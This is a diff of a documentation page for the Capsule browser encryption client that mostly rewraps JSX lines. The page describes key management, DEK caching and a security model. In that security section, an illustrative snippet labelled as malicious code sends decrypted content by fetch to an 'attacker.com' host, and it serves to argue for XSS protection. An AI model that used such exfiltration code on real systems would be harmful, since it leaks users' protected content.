@@ -6,7 +6,8 @@ export default function ClientPage() {
       <h1>Client Integration</h1>
       <p>
         The Capsule client is a lightweight browser library that handles key
-        management, DEK caching, and content decryption using the Web Crypto API.
+        management, DEK caching, and content decryption using the Web Crypto
+        API.
       </p>
 
       <h2>Installation</h2>
@@ -14,14 +15,25 @@ export default function ClientPage() {
 
       <h2>Quick Start (High-Level API)</h2>
       <p>
-        The simplest way to use Capsule - just provide an unlock function and the client 
-        handles everything automatically:
+        The simplest way to use Capsule - just provide an unlock function and
+        the client handles everything automatically:
       </p>
       <ul>
-        <li><strong>Key generation</strong> - RSA key pairs created on-demand</li>
-        <li><strong>DEK caching</strong> - encrypted DEKs stored for reuse</li>
-        <li><strong>Auto-renewal</strong> - time-bucketed keys are automatically renewed before expiry</li>
-        <li><strong>Script execution</strong> - <code>&lt;script&gt;</code> tags in decrypted HTML are executed (browsers don&apos;t run scripts inserted via innerHTML)</li>
+        <li>
+          <strong>Key generation</strong> - RSA key pairs created on-demand
+        </li>
+        <li>
+          <strong>DEK caching</strong> - encrypted DEKs stored for reuse
+        </li>
+        <li>
+          <strong>Auto-renewal</strong> - time-bucketed keys are automatically
+          renewed before expiry
+        </li>
+        <li>
+          <strong>Script execution</strong> - <code>&lt;script&gt;</code> tags
+          in decrypted HTML are executed (browsers don&apos;t run scripts
+          inserted via innerHTML)
+        </li>
       </ul>
       <CodeBlock>{`import { CapsuleClient } from '@sesamy/capsule';
 
@@ -49,8 +61,8 @@ await capsule.processAll();`}</CodeBlock>
 
       <h3>Example: Encrypted Content with Embedded Script</h3>
       <p>
-        When content is decrypted, any <code>&lt;script&gt;</code> tags are automatically executed.
-        This enables interactive premium content:
+        When content is decrypted, any <code>&lt;script&gt;</code> tags are
+        automatically executed. This enables interactive premium content:
       </p>
       <CodeBlock language="html">{`<!-- This is what your encrypted content might look like when decrypted -->
 <article class="premium-content">
@@ -86,7 +98,8 @@ await capsule.processAll();`}</CodeBlock>
 
       <h2>Auto-Processing with Events</h2>
       <p>
-        Enable <code>autoProcess</code> to automatically unlock all encrypted elements on page load:
+        Enable <code>autoProcess</code> to automatically unlock all encrypted
+        elements on page load:
       </p>
       <CodeBlock>{`const capsule = new CapsuleClient({
   unlock: myUnlockFunction,
@@ -146,12 +159,17 @@ document.addEventListener('capsule:state', (e) => {
       <h3>High-Level Methods</h3>
 
       <h4>getPublicKey()</h4>
-      <p>Get the user's public key. <strong>Creates keys automatically if they don't exist.</strong></p>
+      <p>
+        Get the user's public key.{" "}
+        <strong>Creates keys automatically if they don't exist.</strong>
+      </p>
       <CodeBlock>{`const publicKey = await capsule.getPublicKey();
 // Returns: Base64-encoded SPKI public key`}</CodeBlock>
 
       <h4>unlock(article, preferredKeyType?)</h4>
-      <p>Decrypt an encrypted article using cached DEK or by fetching a new one.</p>
+      <p>
+        Decrypt an encrypted article using cached DEK or by fetching a new one.
+      </p>
       <CodeBlock>{`const content = await capsule.unlock(encryptedArticle, 'tier');
 // Returns: Decrypted content as string`}</CodeBlock>
 
@@ -243,48 +261,111 @@ function Article({ encryptedData }) {
 }`}</CodeBlock>
 
       <h2>DEK Storage Modes</h2>
-      <p>Control how decrypted DEKs are cached for performance and offline access:</p>
-      <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '1rem' }}>
+      <p>
+        Control how decrypted DEKs are cached for performance and offline
+        access:
+      </p>
+      <table
+        style={{ width: "100%", borderCollapse: "collapse", marginTop: "1rem" }}
+      >
         <thead>
           <tr>
-            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>Mode</th>
-            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>Storage</th>
-            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>Persistence</th>
-            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>Use Case</th>
+            <th
+              style={{
+                textAlign: "left",
+                padding: "0.5rem",
+                borderBottom: "1px solid #ddd",
+              }}
+            >
+              Mode
+            </th>
+            <th
+              style={{
+                textAlign: "left",
+                padding: "0.5rem",
+                borderBottom: "1px solid #ddd",
+              }}
+            >
+              Storage
+            </th>
+            <th
+              style={{
+                textAlign: "left",
+                padding: "0.5rem",
+                borderBottom: "1px solid #ddd",
+              }}
+            >
+              Persistence
+            </th>
+            <th
+              style={{
+                textAlign: "left",
+                padding: "0.5rem",
+                borderBottom: "1px solid #ddd",
+              }}
+            >
+              Use Case
+            </th>
           </tr>
         </thead>
         <tbody>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}><code>'memory'</code></td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>JavaScript</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Page refresh</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Maximum security</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              <code>'memory'</code>
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              JavaScript
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Page refresh
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Maximum security
+            </td>
           </tr>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}><code>'session'</code></td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>sessionStorage</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Tab close</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Balance security/UX</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              <code>'session'</code>
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              sessionStorage
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Tab close
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Balance security/UX
+            </td>
           </tr>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}><code>'persist'</code></td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>IndexedDB</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Browser restart</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Best offline support</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              <code>'persist'</code>
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              IndexedDB
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Browser restart
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Best offline support
+            </td>
           </tr>
         </tbody>
       </table>
-      <p style={{ marginTop: '0.5rem', fontSize: '0.9rem', opacity: 0.8 }}>
-        Note: DEKs are stored <strong>encrypted</strong> with the user's public key. They must be 
-        unwrapped using the private key each time (which never leaves the browser's crypto subsystem).
+      <p style={{ marginTop: "0.5rem", fontSize: "0.9rem", opacity: 0.8 }}>
+        Note: DEKs are stored <strong>encrypted</strong> with the user's public
+        key. They must be unwrapped using the private key each time (which never
+        leaves the browser's crypto subsystem).
       </p>
 
       <h2>Security Model</h2>
-      
+
       <h3>Private Key Protection: The Core Guarantee</h3>
       <p>
-        The Capsule client's security foundation is that <strong>the private key cannot be 
-        extracted from the browser</strong>, even by the user or malicious JavaScript code.
+        The Capsule client's security foundation is that{" "}
+        <strong>the private key cannot be extracted from the browser</strong>,
+        even by the user or malicious JavaScript code.
       </p>
 
       <h4>How Non-Extractable Keys Work</h4>
@@ -302,15 +383,26 @@ function Article({ encryptedData }) {
 
       <p>This means:</p>
       <ul>
-        <li>✅ The key can be <strong>used</strong> for unwrapping DEKs</li>
-        <li>❌ The key cannot be <strong>exported</strong> in any format (JWK, PKCS8, raw bytes)</li>
-        <li>❌ The key cannot be <strong>copied</strong> to another device or browser</li>
-        <li>❌ The key cannot be <strong>downloaded</strong> or sent to a server</li>
+        <li>
+          ✅ The key can be <strong>used</strong> for unwrapping DEKs
+        </li>
+        <li>
+          ❌ The key cannot be <strong>exported</strong> in any format (JWK,
+          PKCS8, raw bytes)
+        </li>
+        <li>
+          ❌ The key cannot be <strong>copied</strong> to another device or
+          browser
+        </li>
+        <li>
+          ❌ The key cannot be <strong>downloaded</strong> or sent to a server
+        </li>
       </ul>
 
       <h4>What About IndexedDB Access?</h4>
       <p>
-        Users and JavaScript code <strong>can access IndexedDB</strong> through DevTools or browser APIs:
+        Users and JavaScript code <strong>can access IndexedDB</strong> through
+        DevTools or browser APIs:
       </p>
       <CodeBlock>{`// You CAN retrieve the key object
 const db = await indexedDB.open('capsule-keys');
@@ -333,63 +425,121 @@ const blob = new Blob([keyPair.privateKey]);
 // Creates: "[object CryptoKey]" (useless string)`}</CodeBlock>
 
       <p>
-        The <code>CryptoKey</code> object in IndexedDB is just a <strong>handle</strong> or{" "}
-        <strong>reference</strong> to the actual key material, which lives in the browser's
-        secure crypto subsystem. Think of it like a key to a safe deposit box that only works
-        inside the bank - you can use it there, but you can't take the contents home.
+        The <code>CryptoKey</code> object in IndexedDB is just a{" "}
+        <strong>handle</strong> or <strong>reference</strong> to the actual key
+        material, which lives in the browser's secure crypto subsystem. Think of
+        it like a key to a safe deposit box that only works inside the bank -
+        you can use it there, but you can't take the contents home.
       </p>
 
       <h4>Attack Vector Analysis</h4>
-      <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '1rem' }}>
+      <table
+        style={{ width: "100%", borderCollapse: "collapse", marginTop: "1rem" }}
+      >
         <thead>
           <tr>
-            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
+            <th
+              style={{
+                textAlign: "left",
+                padding: "0.5rem",
+                borderBottom: "1px solid #ddd",
+              }}
+            >
               Attack Type
             </th>
-            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
+            <th
+              style={{
+                textAlign: "left",
+                padding: "0.5rem",
+                borderBottom: "1px solid #ddd",
+              }}
+            >
               Can Extract Key?
             </th>
-            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
+            <th
+              style={{
+                textAlign: "left",
+                padding: "0.5rem",
+                borderBottom: "1px solid #ddd",
+              }}
+            >
               Notes
             </th>
           </tr>
         </thead>
         <tbody>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Server compromise</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Key never sent to server</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Server compromise
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              ❌ No
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Key never sent to server
+            </td>
           </tr>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Network interception</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Key never transmitted</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Network interception
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              ❌ No
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Key never transmitted
+            </td>
           </tr>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>XSS / malicious JS</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Can use key, cannot export it</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              XSS / malicious JS
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              ❌ No
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Can use key, cannot export it
+            </td>
           </tr>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Browser DevTools</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Can see object, not bytes</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Browser DevTools
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              ❌ No
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Can see object, not bytes
+            </td>
           </tr>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Database breach</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>No server-side key storage</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Database breach
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              ❌ No
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              No server-side key storage
+            </td>
           </tr>
           <tr>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>User manual export</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
-            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Browser prevents all export methods</td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              User manual export
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              ❌ No
+            </td>
+            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
+              Browser prevents all export methods
+            </td>
           </tr>
         </tbody>
       </table>
 
-      <p style={{ marginTop: '1rem' }}>
-        The <strong>only</strong> attack that works is using the key for its intended purpose:
+      <p style={{ marginTop: "1rem" }}>
+        The <strong>only</strong> attack that works is using the key for its
+        intended purpose:
       </p>
       <CodeBlock>{`// Malicious code CAN do this:
 const decryptedContent = await client.decryptArticle(payload);
@@ -399,46 +549,81 @@ await fetch('https://attacker.com', {
 });`}</CodeBlock>
 
       <p>
-        This is why <strong>XSS protection</strong> (Content Security Policy, input sanitization)
-        remains critical - not to protect the key itself, but to prevent unauthorized{" "}
-        <strong>use</strong> of the key.
+        This is why <strong>XSS protection</strong> (Content Security Policy,
+        input sanitization) remains critical - not to protect the key itself,
+        but to prevent unauthorized <strong>use</strong> of the key.
       </p>
 
       <h3>Additional Security Layers</h3>
       <ul>
-        <li><strong>DEKs in Memory Only</strong>: Unwrapped DEKs are cached in JavaScript memory 
-          (not persisted) and lost on page refresh</li>
-        <li><strong>AES-GCM Authentication</strong>: 128-bit auth tags prevent tampering with 
-          encrypted content</li>
-        <li><strong>Web Crypto API</strong>: Uses hardware-accelerated cryptography when available 
-          (TPM, Secure Enclave)</li>
-        <li><strong>Secure Context Requirement</strong>: Web Crypto API only works over HTTPS or localhost</li>
-        <li><strong>Origin Isolation</strong>: IndexedDB is bound to the origin - other websites 
-          cannot access your keys</li>
+        <li>
+          <strong>DEKs in Memory Only</strong>: Unwrapped DEKs are cached in
+          JavaScript memory (not persisted) and lost on page refresh
+        </li>
+        <li>
+          <strong>AES-GCM Authentication</strong>: 128-bit auth tags prevent
+          tampering with encrypted content
+        </li>
+        <li>
+          <strong>Web Crypto API</strong>: Uses hardware-accelerated
+          cryptography when available (TPM, Secure Enclave)
+        </li>
+        <li>
+          <strong>Secure Context Requirement</strong>: Web Crypto API only works
+          over HTTPS or localhost
+        </li>
+        <li>
+          <strong>Origin Isolation</strong>: IndexedDB is bound to the origin -
+          other websites cannot access your keys
+        </li>
       </ul>
 
       <h3>What This Means for Your Application</h3>
       <ul>
-        <li>✅ <strong>Server compromise cannot leak user keys</strong> - They're not on the server</li>
-        <li>✅ <strong>Database breach cannot decrypt content</strong> - Private keys are client-side only</li>
-        <li>✅ <strong>Network eavesdropping is ineffective</strong> - Only wrapped DEKs are transmitted</li>
-        <li>✅ <strong>Users cannot accidentally export their keys</strong> - Browser prevents it</li>
-        <li>✅ <strong>True end-to-end encryption</strong> - Only the user's browser can decrypt</li>
+        <li>
+          ✅ <strong>Server compromise cannot leak user keys</strong> - They're
+          not on the server
+        </li>
+        <li>
+          ✅ <strong>Database breach cannot decrypt content</strong> - Private
+          keys are client-side only
+        </li>
+        <li>
+          ✅ <strong>Network eavesdropping is ineffective</strong> - Only
+          wrapped DEKs are transmitted
+        </li>
+        <li>
+          ✅ <strong>Users cannot accidentally export their keys</strong> -
+          Browser prevents it
+        </li>
+        <li>
+          ✅ <strong>True end-to-end encryption</strong> - Only the user's
+          browser can decrypt
+        </li>
       </ul>
 
       <h3>Limitations and Trade-offs</h3>
       <ul>
-        <li>⚠️ <strong>Key loss means data loss</strong>: If a user clears browser data or switches 
-          devices, they lose access</li>
-        <li>⚠️ <strong>No cross-device sync</strong>: Keys are tied to a single browser profile</li>
-        <li>⚠️ <strong>XSS can still abuse keys</strong>: Malicious code can decrypt content (though 
-          not steal keys)</li>
+        <li>
+          ⚠️ <strong>Key loss means data loss</strong>: If a user clears browser
+          data or switches devices, they lose access
+        </li>
+        <li>
+          ⚠️ <strong>No cross-device sync</strong>: Keys are tied to a single
+          browser profile
+        </li>
+        <li>
+          ⚠️ <strong>XSS can still abuse keys</strong>: Malicious code can
+          decrypt content (though not steal keys)
+        </li>
       </ul>
 
       <p>Consider implementing:</p>
       <ul>
         <li>Server-side encrypted key backup (wrapped with user password)</li>
-        <li>Multi-device key synchronization (using secure key exchange protocols)</li>
+        <li>
+          Multi-device key synchronization (using secure key exchange protocols)
+        </li>
         <li>Content Security Policy (CSP) to prevent XSS attacks</li>
       </ul>
 
